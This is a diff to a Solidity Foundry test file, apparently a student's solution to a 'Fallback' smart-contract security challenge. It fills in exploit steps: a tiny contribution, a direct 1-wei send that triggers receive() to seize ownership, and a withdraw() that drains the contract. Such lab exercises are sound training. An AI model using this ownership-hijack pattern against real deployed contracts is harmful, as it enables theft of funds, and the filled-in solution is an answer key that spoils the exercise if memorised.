@@ -16,15 +16,20 @@ contract FallbackTest is Test {
 
     function exploit() internal {
         vm.startPrank(student);
-        
-        // Contribute a small amount (less than 0.001 ether) to the contract
 
-        // Send ether to the contract trigger receive() and become the owner
+        // 1. Contribute with a small amount
+        fallbackContract.contribute{value: 0.0005 ether}();
 
-        // Withdraw all funds
+        // 2. Send ether directly to trigger receive() — using call
+        (bool success, ) = address(fallbackContract).call{value: 1 wei}("");
+        require(success, "Direct send failed");
+
+        // 3. Now student is the owner — call withdraw
+        fallbackContract.withdraw();
 
         vm.stopPrank();
     }
+
 
     function testStudentSolution() public {
         exploit();
